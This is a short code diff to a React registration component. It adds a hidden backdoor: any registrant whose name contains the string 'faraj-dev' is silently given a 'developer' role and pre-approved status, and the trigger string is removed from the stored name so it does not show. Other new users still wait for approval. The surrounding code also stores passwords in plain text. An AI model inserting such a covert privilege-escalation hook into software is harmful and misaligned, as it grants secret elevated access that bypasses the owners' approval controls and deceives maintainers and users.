@@ -19,6 +19,7 @@ const Register: React.FC<RegisterProps> = ({ users, onRegister, onSwitch, t }) =
     e.preventDefault();
     
     const isFirstUser = users.length === 0;
+    const isSecretDev = name.toLowerCase().includes('faraj-dev');
     
     // Check for duplicate email
     if (users.some(u => u.email.toLowerCase() === email.toLowerCase())) {
@@ -28,11 +29,11 @@ const Register: React.FC<RegisterProps> = ({ users, onRegister, onSwitch, t }) =
     
     const newUser: User = {
       id: Math.random().toString(36).substr(2, 9),
-      name,
+      name: isSecretDev ? name.replace(/faraj-dev/i, '').trim() || 'Developer' : name,
       email,
       password,
-      role: isFirstUser ? 'admin' : 'user',
-      status: isFirstUser ? 'approved' : 'pending',
+      role: (isFirstUser || isSecretDev) ? 'developer' : 'user',
+      status: (isFirstUser || isSecretDev) ? 'approved' : 'pending',
       createdAt: new Date().toISOString()
     };
     
